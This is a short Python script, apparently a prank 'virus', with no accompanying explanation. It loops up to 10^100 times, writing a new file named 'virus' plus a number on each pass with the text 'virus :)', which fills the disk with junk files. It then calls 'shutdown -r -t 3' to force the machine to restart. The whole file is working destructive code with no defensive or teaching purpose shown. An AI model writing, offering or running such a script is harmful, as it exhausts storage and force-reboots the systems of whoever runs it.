import math
import subprocess

def restart():
    subprocess.call(['shutdown','-r','-t','3'])
    
print('ok')
for a in range(0,pow(10,100)):
    a1=str(a)
    filepath='virus'+a1+'.txt'
    vfile=open(filepath,'w')
    string='virus :)'
    vfile.write(string)
    vfile.close()
restart()